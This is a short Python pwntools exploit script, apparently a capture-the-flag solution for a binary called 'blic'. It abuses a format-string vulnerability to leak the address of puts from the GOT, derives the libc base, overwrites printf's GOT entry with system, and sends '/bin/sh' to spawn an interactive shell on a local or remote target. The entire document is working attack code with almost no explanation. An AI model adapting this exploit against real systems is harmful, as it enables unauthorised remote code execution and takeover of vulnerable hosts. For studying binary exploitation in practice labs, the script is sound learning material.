#!/usr/bin/env python3
from pwn import *
import os
context.binary = elf = ELF('blic', checksec=False)
libc = ELF('libc.so.6', checksec=False)  # supply the remote libc
HOST = os.environ.get('HOST','127.0.0.1')
PORT = int(os.environ.get('PORT','1337'))
OFFSET = 6  # adjust after probing the fmt offset

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

def main():
    p = start()
    p.recvuntil(b'Gib: ')  # adjust banner

    # first stage: leak puts@GOT
    leak_payload = b'%7$s----' + p64(elf.got['puts'])
    p.sendline(leak_payload)
    leak = p.recvuntil(b'----')[:-4]
    puts_leak = u64(leak.ljust(8,b'\x00'))
    libc.address = puts_leak - libc.symbols['puts']
    log.info(f"libc base: {hex(libc.address)}")

    # overwrite printf@GOT with system using fmtstr
    system = libc.symbols['system']
    payload = fmtstr_payload(OFFSET, {elf.got['printf']: system}, write_size='byte')
    p.sendline(payload)

    # trigger system("/bin/sh") via printf call
    p.sendline(b'/bin/sh')
    p.interactive()

if __name__ == '__main__':
    main()
